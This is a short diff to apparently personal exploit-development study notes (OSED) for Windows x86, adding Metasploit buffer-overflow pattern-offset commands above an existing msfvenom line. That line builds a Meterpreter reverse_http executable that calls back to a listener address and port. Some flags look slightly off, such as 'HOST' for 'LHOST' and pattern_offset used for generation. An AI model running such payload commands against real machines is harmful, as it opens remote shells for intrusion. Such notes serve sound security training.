@@ -1,5 +1,11 @@
 # x86Win-OSED-Notes
 
+Pattern generation:
+```
+$ msf-pattern_offset -l 800
+$ msf-pattern_offset -l 800 -q 42306142
+```
+
 met payload:
 ```
 $ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
